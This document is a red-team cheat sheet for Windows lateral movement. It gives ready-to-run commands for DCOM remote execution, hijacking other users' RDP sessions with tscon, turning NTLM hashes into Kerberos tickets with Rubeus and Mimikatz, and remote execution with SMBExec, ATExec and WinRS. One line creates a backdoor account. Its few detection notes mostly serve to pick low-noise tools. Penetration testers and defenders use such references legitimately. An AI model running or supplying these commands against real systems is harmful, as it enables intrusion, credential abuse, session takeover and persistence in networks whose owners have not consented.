# DCOM / RDP Hijacking / Over-Pass-the-Hash / SMBExec

## DCOM Lateral Movement

Execute code on remote hosts via COM objects — leaves no SMB-based service artifacts.

**MMC20.Application**
```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "TARGET_IP"))
$com.Document.ActiveView.ExecuteShellCommand("cmd.exe", $null, "/c calc.exe", "7")
```

**ShellWindows / ShellBrowserWindow**
```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromCLSID([guid]"9BA05972-F6A8-11CF-A442-00A0C90A8F39","TARGET_IP"))
$item = $com.Item()
$item.Document.Application.ShellExecute("cmd.exe","/c whoami > C:\temp\out.txt","c:\windows\system32",$null,0)
```

**Impacket dcomexec**
```bash
dcomexec.py DOMAIN/user:password@TARGET_IP
dcomexec.py -hashes :NTLM_HASH DOMAIN/user@TARGET_IP
dcomexec.py -hashes :NTLM_HASH DOMAIN/user@TARGET_IP 'whoami'  # single command
```

**Detection note**: DCOM lateral movement uses TCP 135 (RPC endpoint mapper) + high ports. Unusual `mmc.exe` spawning child processes is an indicator.

---

## RDP Session Hijacking (tscon)

Hijack another user's active RDP session without knowing their password — requires SYSTEM.

```cmd
# List active sessions
query session
# Output:
# SESSIONNAME  USERNAME   ID  STATE
# rdp-tcp#3    alice       3  Active
# rdp-tcp#5    bob         5  Active

# Elevate to SYSTEM (if already admin)
PsExec.exe -s cmd.exe

# Hijack session (from SYSTEM context)
tscon.exe 3 /dest:rdp-tcp#0     # connect session 3 to our console
tscon.exe 3 /dest:rdp-tcp#5     # connect session 3 to session 5

# Alternative via service (if PsExec not available)
sc create hijack binPath= "cmd.exe /k tscon.exe 3 /dest:rdp-tcp#0" start= demand
sc start hijack
```

**Linux: xfreerdp with PTH**
```bash
xfreerdp /u:Administrator /pth:NTLM_HASH /v:TARGET_IP /cert-ignore
```

---

## Over-Pass-the-Hash (OPtH)

Convert NTLM hash to Kerberos TGT — more OPSEC-safe than raw PTH (avoids NTLMv1/v2 on wire).

```powershell
# Rubeus — request TGT using NTLM hash, inject into current session
Rubeus.exe asktgt /user:Administrator /rc4:NTLM_HASH /ptt
Rubeus.exe asktgt /user:Administrator /aes256:AES256_HASH /opsec /ptt

# Rubeus — save to file for later use
Rubeus.exe asktgt /user:Administrator /rc4:NTLM_HASH /outfile:admin.kirbi

# Mimikatz
sekurlsa::pth /user:Administrator /domain:DOMAIN /ntlm:HASH /run:powershell.exe
# Spawns powershell with injected Kerberos identity

# Verify ticket injection
klist
```

**When to use OPtH over PTH**: when SMB signing is enforced (blocks raw PTH) but Kerberos is available.

---

## SMBExec / ATExec / WinRS

```bash
# SMBExec — service-based execution, semi-interactive
smbexec.py DOMAIN/user:password@TARGET_IP
smbexec.py -hashes :NTLM_HASH DOMAIN/user@TARGET_IP

# ATExec — execute via Task Scheduler, output captured to temp file
atexec.py DOMAIN/user:password@TARGET_IP whoami
atexec.py -hashes :NTLM_HASH DOMAIN/user@TARGET_IP "net user backdoor P@ss123! /add"

# WinRS (built-in Windows Remote Shell — uses WinRM/5985)
winrs -r:TARGET_IP -u:DOMAIN\user -p:password cmd.exe
winrs -r:TARGET_IP -u:DOMAIN\user -p:password "powershell -c whoami"
```

**Tool comparison**

| Tool | Transport | Leaves | Detection |
|------|-----------|--------|-----------|
| psexec | SMB 445 | Service artifact | High — PSEXESVC service |
| smbexec | SMB 445 | Temp service (deleted) | Medium |
| wmiexec | DCOM 135 | None | Low — no service |
| atexec | SMB 445 | Task in scheduler | Medium |
| winrs/evil-winrm | WinRM 5985 | None | Low if WinRM normal |
| dcomexec | DCOM 135 | None | Low |
